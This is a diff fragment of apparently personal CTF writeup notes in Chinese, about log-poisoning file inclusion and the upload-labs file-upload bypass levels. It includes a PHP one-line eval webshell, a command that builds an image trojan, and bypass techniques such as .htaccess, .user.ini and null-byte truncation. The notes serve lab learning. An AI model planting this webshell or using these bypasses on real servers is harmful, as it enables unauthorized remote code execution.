+<h2 id="4"><a href="#4" class="headerlink" title="4"></a>4</h2><p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/b0ef108a-image.png" alt="image.png"></p>
+<p>根据提示,百度了log file,是日志文件,而日志文件就是记录系统活动信息的几个文件，如：何时、何地（来源IP）、何人（什么服务名称）、做了什么操作（信息登录）换句话说就是记录系统在什么时候由哪个进程做了什么样的操作时，发生了何种的事件</p>
+<p>按照提示,植入一句话木马,尽量使用burp suite来操作,使用hackbar会对&lt;?和空格进行编码,导致木马写入失败(以身试险过),日志文件不会对url解码</p>
+<p>先试过hackbar,抓包后是这样的</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/5038d31f-%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230111_110023.png" alt="屏幕截图_20230111_110023.png"></p>
+<p>改好再返回</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/31e3b0c7-%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230111_110004.png" alt="屏幕截图_20230111_110004.png"></p>
+<p>将抓到的包返回后</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/77bcf26e-%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230111_110053.png" alt="屏幕截图_20230111_110053.png"></p>
+<p>查找得知在不同的系统，存放日志文件地方和文件名不同<br>apache一般是&#x2F;var&#x2F;log&#x2F;apache&#x2F;access.log</p>
+<p>nginx一般是在&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log和&#x2F;var&#x2F;log&#x2F;nginx&#x2F;error.log</p>
+<p>再根据返回包的信息可以知道,日志的路径是&#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log</p>
+<p>使用文件包含漏洞包含日志文件</p>
+<p>URL:<a target="_blank" rel="noopener" href="http://114.116.119.253:8001/challenge4.php?file=/var/log/apache2/access.log">http://114.116.119.253:8001/challenge4.php?file=/var/log/apache2/access.log</a></p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/2e84c2b6-%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230111_110207.png" alt="屏幕截图_20230111_110207.png"></p>
+<p>可以看到日志文件已经被污染,连接蚁剑就可以找到flag了</p>
+<p>flag的位置:&#x2F;secret&#x2F;challenge4_flag</p>
 <?php
 
 $flag="HnuSec{You_Are_4_B1g_H4ack3r_N0w!_yOu_HavE_7iNish_a11_prOblems}";
 
 ?>
 
-# 文件上传
-
-根据网上的教程下好phpstudy配置好环境后,再下载upload-labs靶场源码,解压到phpstudy_pro/www目录下
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/2144b082-image.png)
-
-点击创建网站
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/e72496ed-image.png)
-
-靶场搭建完成
-
-## pass-01
-
-js过滤
-
-### 方法一
-
-前端js验证
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/6e42cefa-image.png)
-
-自己编写了一个一句话木马php文件上传，弹出一个框,这是一个前端过滤,由网页前端控制,可以直接进行更改(朔峰师傅教的)
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/03da4925-image.png)
-
-return chackfile():对文件名进行检查,可以直接删掉,上传成功
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/c90ea69f-image.png)
-
-### 方法二
-
-使用burp suite,将文件改为.jpg格式上传,进行抓包,修改文件后缀名再返回,即可上传
-
-![屏幕截图_20230111_163435.png](/yuque-notes/03-CTF Challenge's Writeup/assets/5b3902e5-屏幕截图_20230111_163435.png)
-
-![屏幕截图_20230111_163504.png](/yuque-notes/03-CTF Challenge's Writeup/assets/e97d3ec8-屏幕截图_20230111_163504.png)
-
-### 蚁剑连接
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/8f53172e-image.png)
-
-右键，选择新建标签页打开，将新建标签页的url复制
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/3f0625ed-image.png)
-
-一句话木马那里我一开始自己写的，没有那个@，然后一直就被我的电脑把写好的木马嘎了QAQ,
-
-## pass-02
-
-MIME绕过,contest-type伪造
-
-**Contest-Type**
-
-在 HTTP协议消息头中，它用来表示具体请求中的媒体类型信息。例:text/html 代表 HTML 格式，image/gif 代表 GIF 图片， application/json 代表JSON 类型，
-
-burp抓包,传给render
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/2ea097a1-image.png)
-
-找到contest-type,将text/plain改成image/gif,文件上传成功
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/bd1806d7-image.png)
-
-蚁剑操作相同，之后不再提及
-
-## pass-03
-
-文件后缀名黑名单绕过
-
-**尝试大小写绕过**​![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/2a8feaf6-image.png)
-
-查看源码，发现有强制小写的代码
-
-**尝试后缀名绕过**​
-
-将.php文件后缀名改成php1-9,phtml等后缀名都可以，但是尝试了一下发现不行，去网上查找了一下，发现涉及一些Apache的相关知识
-
-1. Apache解析顺序是从右到左开始解析文件后缀的，如果最右侧扩展名不能识别的话，就继续往左判断，直到遇到可以解析的文件后缀为止。
-2. Apache的httpd.conf中可以进行配置，规定哪些文件后缀是以php格式
-3. ![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/f9f0971f-image.png)
-
-按照教程更改，详情参考大佬的文章[https://www.likecs.com/show-965809.html](https://www.likecs.com/show-965809.html)
-
-然后发现还是不行QAQ，搜索发现我的PHP study版本太新了，即使改了配置也无法实现.php5和.phtml的解析，我懒得下载别的版本了，凑活着我的理论讲解吧。
-
-> 通过修改文件后缀名的方式绕过黑名单，成功上传文件后，用蚁剑连接即可
-
-## pass-04
-
-黑名单绕过
-
-原理：利用.htaccess文件特性， '.htaccess'文件相当于一种部分配置文件，好比局部变量一样，只在当前目录生效，将解析为.php。笼统说，.htaccess可以帮我们实现包括：文件夹密码保护、用户自动重定向、自定义错误页面、改变你的文件扩展名、封禁特定IP地址的用户、只允许特定IP地址的用户、禁止目录列表，以及使用其他文件作为index文件等一些功能。
-
-注：.htaccess文件就叫这个名，前面不要再加别的
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/f060fa69-image.png)这串代码的意思是如果文件中有3.jpg文件，他就会被破解为.php文件
-
-制作图片木马
-
-win+r打开Windows的cdm
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/b448a014-image.png)
-
-利用cd命令转到事先建好的存有一句话木马.php文件，和.jpg文件的文件夹中，利用copy命令，这样我们的图片木马就制作好了
-
-然后首先在界面上传.htaccess文件，再上传图片木马，但是寄了，经过我的搜索，发现又是apache配置的问题，需要修改他的httpd.conf文件，代码如下
-
+<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><p>根据网上的教程下好phpstudy配置好环境后,再下载upload-labs靶场源码,解压到phpstudy_pro&#x2F;www目录下</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/2144b082-image.png" alt="image.png"></p>
+<p>点击创建网站</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/e72496ed-image.png" alt="image.png"></p>
+<p>靶场搭建完成</p>
+<h2 id="pass-01"><a href="#pass-01" class="headerlink" title="pass-01"></a>pass-01</h2><p>js过滤</p>
+<h3 id="方法一-1"><a href="#方法一-1" class="headerlink" title="方法一"></a>方法一</h3><p>前端js验证</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/6e42cefa-image.png" alt="image.png"></p>
+<p>自己编写了一个一句话木马php文件上传，弹出一个框,这是一个前端过滤,由网页前端控制,可以直接进行更改(朔峰师傅教的)</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/03da4925-image.png" alt="image.png"></p>
+<p>return chackfile():对文件名进行检查,可以直接删掉,上传成功</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/c90ea69f-image.png" alt="image.png"></p>
+<h3 id="方法二-1"><a href="#方法二-1" class="headerlink" title="方法二"></a>方法二</h3><p>使用burp suite,将文件改为.jpg格式上传,进行抓包,修改文件后缀名再返回,即可上传</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/5b3902e5-%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230111_163435.png" alt="屏幕截图_20230111_163435.png"></p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/e97d3ec8-%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20230111_163504.png" alt="屏幕截图_20230111_163504.png"></p>
+<h3 id="蚁剑连接"><a href="#蚁剑连接" class="headerlink" title="蚁剑连接"></a>蚁剑连接</h3><p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/8f53172e-image.png" alt="image.png"></p>
+<p>右键，选择新建标签页打开，将新建标签页的url复制</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/3f0625ed-image.png" alt="image.png"></p>
+<p>一句话木马那里我一开始自己写的，没有那个@，然后一直就被我的电脑把写好的木马嘎了QAQ,</p>
+<h2 id="pass-02"><a href="#pass-02" class="headerlink" title="pass-02"></a>pass-02</h2><p>MIME绕过,contest-type伪造</p>
+<p><strong>Contest-Type</strong></p>
+<p>在 HTTP协议消息头中，它用来表示具体请求中的媒体类型信息。例:text&#x2F;html 代表 HTML 格式，image&#x2F;gif 代表 GIF 图片， application&#x2F;json 代表JSON 类型，</p>
+<p>burp抓包,传给render</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/2ea097a1-image.png" alt="image.png"></p>
+<p>找到contest-type,将text&#x2F;plain改成image&#x2F;gif,文件上传成功</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/bd1806d7-image.png" alt="image.png"></p>
+<p>蚁剑操作相同，之后不再提及</p>
+<h2 id="pass-03"><a href="#pass-03" class="headerlink" title="pass-03"></a>pass-03</h2><p>文件后缀名黑名单绕过</p>
+<p><strong>尝试大小写绕过</strong>​<img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/2a8feaf6-image.png" alt="image.png"></p>
+<p>查看源码，发现有强制小写的代码</p>
+<p><strong>尝试后缀名绕过</strong>​</p>
+<p>将.php文件后缀名改成php1-9,phtml等后缀名都可以，但是尝试了一下发现不行，去网上查找了一下，发现涉及一些Apache的相关知识</p>
+<ol>
+<li>Apache解析顺序是从右到左开始解析文件后缀的，如果最右侧扩展名不能识别的话，就继续往左判断，直到遇到可以解析的文件后缀为止。</li>
+<li>Apache的httpd.conf中可以进行配置，规定哪些文件后缀是以php格式</li>
+<li><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/f9f0971f-image.png" alt="image.png"></li>
+</ol>
+<p>按照教程更改，详情参考大佬的文章<a target="_blank" rel="noopener" href="https://www.likecs.com/show-965809.html">https://www.likecs.com/show-965809.html</a></p>
+<p>然后发现还是不行QAQ，搜索发现我的PHP study版本太新了，即使改了配置也无法实现.php5和.phtml的解析，我懒得下载别的版本了，凑活着我的理论讲解吧。</p>
+<blockquote>
+<p>通过修改文件后缀名的方式绕过黑名单，成功上传文件后，用蚁剑连接即可</p>
+</blockquote>
+<h2 id="pass-04"><a href="#pass-04" class="headerlink" title="pass-04"></a>pass-04</h2><p>黑名单绕过</p>
+<p>原理：利用.htaccess文件特性， ‘.htaccess’文件相当于一种部分配置文件，好比局部变量一样，只在当前目录生效，将解析为.php。笼统说，.htaccess可以帮我们实现包括：文件夹密码保护、用户自动重定向、自定义错误页面、改变你的文件扩展名、封禁特定IP地址的用户、只允许特定IP地址的用户、禁止目录列表，以及使用其他文件作为index文件等一些功能。</p>
+<p>注：.htaccess文件就叫这个名，前面不要再加别的</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/f060fa69-image.png" alt="image.png">这串代码的意思是如果文件中有3.jpg文件，他就会被破解为.php文件</p>
+<p>制作图片木马</p>
+<p>win+r打开Windows的cdm</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/b448a014-image.png" alt="image.png"></p>
+<p>利用cd命令转到事先建好的存有一句话木马.php文件，和.jpg文件的文件夹中，利用copy命令，这样我们的图片木马就制作好了</p>
+<p>然后首先在界面上传.htaccess文件，再上传图片木马，但是寄了，经过我的搜索，发现又是apache配置的问题，需要修改他的httpd.conf文件，代码如下</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AllowOverride All</span><br></pre></td></tr></table></figure>
 
-修改后就欧克了，上传完图片木马后如何知道他已经起作用了捏，这个时候需要请出我们的include.php文件（上传目录中的可执行文件），打开这个网页，利用文件上传漏洞测试
-
-## pass-05
-
-知识点：限制了.hatccess文件，利用.user.ini文件绕过
-
-> php.ini 是 php的配置文件，.user.ini 中的字段也会被 php 视为配置文件来处理，从而导致 php 的文件解析漏洞。.user.ini实际上就是一个可以由用户“自定义”的php.ini, 是一个能被动态加载的ini文件 修改了.user.ini后，不需要重启中间件，只需要等待user_ini.cache_ttl所设置的时间（默认为300秒），即可被重新加载。想要利用.user.ini这个漏洞的三个条件服务器脚本语言为PHP服务器使用CGI／FastCGI模式  * 使用CGI程序将浏览器，web服务器，php解释器连接起来进行数据交换的工具  上传目录下要有可执行的php文件
-
-^_^百度教我的
-
-首先我们编写一个.user.ini文件
-
-`**auto_prepend_file **在文顶部插入加载文件；`
-
-`**auto_append_file **在文件最后插入加载文件（当文件调用的有exit()时该设置无效）`
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/1f5750ef-image.png)
-
-先上传写好的.user.ini文件，再上传3.jpg文件（之前写的图片木马），当前目录中存在index.php文件，访问他，怎会将3.jpg包含到index.php文件的文件尾中相当于再index.php中执行了require（3.jpg）
-
-## pass-06
-
-原理： Windows 系统下，对于文件名中的大小写不敏感。例如：test.php 和 TeSt.PHP 是一样的。
-
-这一关没有再设置强制大小写转换，文件后缀名改为大写即可绕过
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/aac227fe-image.png)
-
-## pass-07 （空格）pass-08（点号）
-
-原理：特殊文件名test.php.或test.php_(空格)在Windows系统中是不允许的，所以需要在burp上修改，绕过验证后，会被Windows系统自动变回.php，但在Linux上不行。
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/be02c1b4-image.png)
-
-抓包后返回即可
-
-## pass-09
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/93d72ec1-image.png)
-
-查看源码可以知道::$DATA没有被禁止，可以使用Windows文件流绕过
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/012146e6-image.png)
-
-所以我们还是需要借助burp
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/fe2d4b66-image.png)
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/4c850eaa-image.png)
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/edd7f444-image.png)
-
-打开图片会显示这样的界面，将url的::$DATA删掉即可
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/ad7082bf-image.png)
-
-## pass-10
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/01102a4d-image.png)
-
-双写绕过正则
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/0d0c1617-image.png)
-
-emmm但是去upload文件里面看，我的电脑好像识别为.phphpp文件
-
-经过搜索，看到了另外一种方法，拼接绕过。php. .(点空点），根据源代码去点去空，最终会呈现.php.格式
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/2a62a21f-image.png)
-
-## pass-11
-
-原理：双写绕过
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/9dde8ae2-image.png)
-
-**str_ireplace**
-
-*使用一个字符串替换字符串中的另一些字符,*
-
-代码审计：利用这个函数将符合黑名单中的文件后缀名替换为空，但只配对一次，使用双写绕过，将文件后缀名改为.pphphp上传，即可
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/748d68e5-image.png)
-
-## pass-12
-
-查看提示，告诉我们**本pass上传路径可控**，尝试上传.php文件看看有什么提示![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/8ea175df-image.png)
-
-所以这是一个白名单，又因为路径可控，查看源码![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/161131b1-image.png)
-
-所以使用白名单get型0x00（16进制0x）截断绕过
-
-产生条件：
-
-​
-
-需要 php 的版本号低于 5.3.29，且 magic_quotes_gpc 为关闭状态
-
-（打开php的配置文件php-ini，将magic_quotes_gpc设置为Off）
-
-绕过方法：设置上传路径为 upload/phpinfo.php%00 ,添加 phpinfo.php%00 内容为了控制路径，上传文件后缀为白名单即可 例:test.jpg，保存后为/upload/phpinfo.php%00test.jpg，但服务端读取到%00 时会自动结束，将文件内容保存至 phpinfo.php 中（原理）
-
-原文链接：[https://blog.csdn.net/MCTSOG/article/details/123342344](https://blog.csdn.net/MCTSOG/article/details/123342344)
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/860f7eb9-image.png)
-
-我哭廖，就这个版本下不起。害，苦逼的去手动配置
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/92c1231c-image.png)
-
-![-6d947708215e444b.jpg](/yuque-notes/03-CTF Challenge's Writeup/assets/c270a3ba--6d947708215e444b.jpg)
-
-上传成功后，另一个标签页面打开图片也是没有的，删掉后面的.jpg就可以了
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/3123572a-image.png)
-
-## pass-13
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/45e373f8-image.png)
-
-白名单 POST 型 0x00 截断
-
-区别GET会自行解码，POST不会自行解码， 们需要**修改HTTP包中上传路径对应的十六进制值**（改为00）进行截断攻击
-
-burp抓包，修改
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/788049c8-image.png)
-
-点击Hex选项卡
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/2d9da0ab-image.png)
-
-找到该字段，修改为00，即截断
-
-## pass-14
-
-图片木马，查看提示只检查开头两给字节
-
-制作木马写入明文密码
-
-注：**PHP版本>5.3且必须在php.ini中开启allow_url_fopen选项。**
-
-访问include.php，将参数设置为图片木马的URL
-
-​
-
+<p>修改后就欧克了，上传完图片木马后如何知道他已经起作用了捏，这个时候需要请出我们的include.php文件（上传目录中的可执行文件），打开这个网页，利用文件上传漏洞测试</p>
+<h2 id="pass-05"><a href="#pass-05" class="headerlink" title="pass-05"></a>pass-05</h2><p>知识点：限制了.hatccess文件，利用.user.ini文件绕过</p>
+<blockquote>
+<p>php.ini 是 php的配置文件，.user.ini 中的字段也会被 php 视为配置文件来处理，从而导致 php 的文件解析漏洞。.user.ini实际上就是一个可以由用户“自定义”的php.ini, 是一个能被动态加载的ini文件 修改了.user.ini后，不需要重启中间件，只需要等待user_ini.cache_ttl所设置的时间（默认为300秒），即可被重新加载。想要利用.user.ini这个漏洞的三个条件服务器脚本语言为PHP服务器使用CGI／FastCGI模式  * 使用CGI程序将浏览器，web服务器，php解释器连接起来进行数据交换的工具  上传目录下要有可执行的php文件</p>
+</blockquote>
+<p>^_^百度教我的</p>
+<p>首先我们编写一个.user.ini文件</p>
+<p><code>**auto_prepend_file **在文顶部插入加载文件；</code></p>
+<p><code>**auto_append_file **在文件最后插入加载文件（当文件调用的有exit()时该设置无效）</code></p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/1f5750ef-image.png" alt="image.png"></p>
+<p>先上传写好的.user.ini文件，再上传3.jpg文件（之前写的图片木马），当前目录中存在index.php文件，访问他，怎会将3.jpg包含到index.php文件的文件尾中相当于再index.php中执行了require（3.jpg）</p>
+<h2 id="pass-06"><a href="#pass-06" class="headerlink" title="pass-06"></a>pass-06</h2><p>原理： Windows 系统下，对于文件名中的大小写不敏感。例如：test.php 和 TeSt.PHP 是一样的。</p>
+<p>这一关没有再设置强制大小写转换，文件后缀名改为大写即可绕过</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/aac227fe-image.png" alt="image.png"></p>
+<h2 id="pass-07-（空格）pass-08（点号）"><a href="#pass-07-（空格）pass-08（点号）" class="headerlink" title="pass-07 （空格）pass-08（点号）"></a>pass-07 （空格）pass-08（点号）</h2><p>原理：特殊文件名test.php.或test.php_(空格)在Windows系统中是不允许的，所以需要在burp上修改，绕过验证后，会被Windows系统自动变回.php，但在Linux上不行。</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/be02c1b4-image.png" alt="image.png"></p>
+<p>抓包后返回即可</p>
+<h2 id="pass-09"><a href="#pass-09" class="headerlink" title="pass-09"></a>pass-09</h2><p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/93d72ec1-image.png" alt="image.png"></p>
+<p>查看源码可以知道::$DATA没有被禁止，可以使用Windows文件流绕过</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/012146e6-image.png" alt="image.png"></p>
+<p>所以我们还是需要借助burp</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/fe2d4b66-image.png" alt="image.png"></p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/4c850eaa-image.png" alt="image.png"></p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/edd7f444-image.png" alt="image.png"></p>
+<p>打开图片会显示这样的界面，将url的::$DATA删掉即可</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/ad7082bf-image.png" alt="image.png"></p>
+<h2 id="pass-10"><a href="#pass-10" class="headerlink" title="pass-10"></a>pass-10</h2><p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/01102a4d-image.png" alt="image.png"></p>
+<p>双写绕过正则</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/0d0c1617-image.png" alt="image.png"></p>
+<p>emmm但是去upload文件里面看，我的电脑好像识别为.phphpp文件</p>
+<p>经过搜索，看到了另外一种方法，拼接绕过。php. .(点空点），根据源代码去点去空，最终会呈现.php.格式</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/2a62a21f-image.png" alt="image.png"></p>
+<h2 id="pass-11"><a href="#pass-11" class="headerlink" title="pass-11"></a>pass-11</h2><p>原理：双写绕过</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/9dde8ae2-image.png" alt="image.png"></p>
+<p><strong>str_ireplace</strong></p>
+<p><em>使用一个字符串替换字符串中的另一些字符,</em></p>
+<p>代码审计：利用这个函数将符合黑名单中的文件后缀名替换为空，但只配对一次，使用双写绕过，将文件后缀名改为.pphphp上传，即可</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/748d68e5-image.png" alt="image.png"></p>
+<h2 id="pass-12"><a href="#pass-12" class="headerlink" title="pass-12"></a>pass-12</h2><p>查看提示，告诉我们<strong>本pass上传路径可控</strong>，尝试上传.php文件看看有什么提示<img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/8ea175df-image.png" alt="image.png"></p>
+<p>所以这是一个白名单，又因为路径可控，查看源码<img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/161131b1-image.png" alt="image.png"></p>
+<p>所以使用白名单get型0x00（16进制0x）截断绕过</p>
+<p>产生条件：</p>
+<p>​</p>
+<p>需要 php 的版本号低于 5.3.29，且 magic_quotes_gpc 为关闭状态</p>
+<p>（打开php的配置文件php-ini，将magic_quotes_gpc设置为Off）</p>
+<p>绕过方法：设置上传路径为 upload&#x2F;phpinfo.php%00 ,添加 phpinfo.php%00 内容为了控制路径，上传文件后缀为白名单即可 例:test.jpg，保存后为&#x2F;upload&#x2F;phpinfo.php%00test.jpg，但服务端读取到%00 时会自动结束，将文件内容保存至 phpinfo.php 中（原理）</p>
+<p>原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/MCTSOG/article/details/123342344">https://blog.csdn.net/MCTSOG/article/details/123342344</a></p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/860f7eb9-image.png" alt="image.png"></p>
+<p>我哭廖，就这个版本下不起。害，苦逼的去手动配置</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/92c1231c-image.png" alt="image.png"></p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/c270a3ba--6d947708215e444b.jpg" alt="-6d947708215e444b.jpg"></p>
+<p>上传成功后，另一个标签页面打开图片也是没有的，删掉后面的.jpg就可以了</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/3123572a-image.png" alt="image.png"></p>
+<h2 id="pass-13"><a href="#pass-13" class="headerlink" title="pass-13"></a>pass-13</h2><p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/45e373f8-image.png" alt="image.png"></p>
+<p>白名单 POST 型 0x00 截断</p>
+<p>区别GET会自行解码，POST不会自行解码， 们需要<strong>修改HTTP包中上传路径对应的十六进制值</strong>（改为00）进行截断攻击</p>
+<p>burp抓包，修改</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/788049c8-image.png" alt="image.png"></p>
+<p>点击Hex选项卡</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/2d9da0ab-image.png" alt="image.png"></p>
+<p>找到该字段，修改为00，即截断</p>
+<h2 id="pass-14"><a href="#pass-14" class="headerlink" title="pass-14"></a>pass-14</h2><p>图片木马，查看提示只检查开头两给字节</p>
+<p>制作木马写入明文密码</p>
+<p>注：<strong>PHP版本&gt;5.3且必须在php.ini中开启allow_url_fopen选项。</strong></p>
+<p>访问include.php，将参数设置为图片木马的URL</p>
+<p>​</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">D:\木马&gt;copy 3.jpg/b+1.php/a 2.jpg		//制作图片木马</span><br><span class="line"></span><br><span class="line">&lt;?php eval(@$_POST[1]);?&gt; //1.php</span><br></pre></td></tr></table></figure>
 
-url:[http://upload-labs/include.php?1=http://upload-labs/upload/7220230201001741.png](http://upload-labs/include.php?1=http://upload-labs/upload/7220230201001741.png)
-
-## pass-15
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/85a488ec-image.png)
-
-getimagesize() 函数用于获取图像大小及相关信息，成功返回一个数组
-
-过程与pass14相同，制作图片木马为图片即可
-
-## pass-16
-
-**注：必须开启php_exif模块**
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/4021606f-image.png)
-
-本pass使用exif_imagetype()检查是否为图片文件
-
-过程同pass-14
-
-不管用什么PHP函数检测图片，只要图片木马能在本地用照片浏览器正常地打开，就能用文件解析漏洞绕过
-
-## pass-17
-
-本Pass对上传后的图片文件进行了**二次渲染**（**即根据原有的图片生成新的标准化的图片**)，感觉就是利用一些规则重新提取一遍图片，避开图片木马
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/05ee1fec-image.png)
-
-利用 imagecreatefromgif 判断是否为 .jpg .gif .png 图片
-
-**imagecreatefromjpeg()** ： 返回一图像标识符，代表了从给定的文件名取得的图像 在失败时返回一个空字符串，并且输出一条错误信息
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/42d1f34c-image.png)
-
-将上传上去的图片码与渲染后的图片进行比较，下载了一个二进制比较器 Fairdell HexCmp，找到不变的地方，就可以插入一句话木马了
-
-## pass-18
-
-原理： 条件竞争方法（**即在文件被删除之前访问该文件**）绕过，需要不停且迅速的上传，访问文件
-
-![image.png](/yuque-notes/03-CTF Challenge's Writeup/assets/340e85ca-image.png)
-
+<p>url:<a target="_blank" rel="noopener" href="http://upload-labs/include.php?1=http://upload-labs/upload/7220230201001741.png">http://upload-labs/include.php?1=http://upload-labs/upload/7220230201001741.png</a></p>
+<h2 id="pass-15"><a href="#pass-15" class="headerlink" title="pass-15"></a>pass-15</h2><p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/85a488ec-image.png" alt="image.png"></p>
+<p>getimagesize() 函数用于获取图像大小及相关信息，成功返回一个数组</p>
+<p>过程与pass14相同，制作图片木马为图片即可</p>
+<h2 id="pass-16"><a href="#pass-16" class="headerlink" title="pass-16"></a>pass-16</h2><p><strong>注：必须开启php_exif模块</strong></p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/4021606f-image.png" alt="image.png"></p>
+<p>本pass使用exif_imagetype()检查是否为图片文件</p>
+<p>过程同pass-14</p>
+<p>不管用什么PHP函数检测图片，只要图片木马能在本地用照片浏览器正常地打开，就能用文件解析漏洞绕过</p>
+<h2 id="pass-17"><a href="#pass-17" class="headerlink" title="pass-17"></a>pass-17</h2><p>本Pass对上传后的图片文件进行了<strong>二次渲染</strong>（<strong>即根据原有的图片生成新的标准化的图片</strong>)，感觉就是利用一些规则重新提取一遍图片，避开图片木马</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/05ee1fec-image.png" alt="image.png"></p>
+<p>利用 imagecreatefromgif 判断是否为 .jpg .gif .png 图片</p>
+<p><strong>imagecreatefromjpeg()</strong> ： 返回一图像标识符，代表了从给定的文件名取得的图像 在失败时返回一个空字符串，并且输出一条错误信息</p>
+<p><img src="/yuque-notes/03-CTF%20Challenge's%20Writeup/assets/42d1f34c-image.png" alt="image.png"></p>
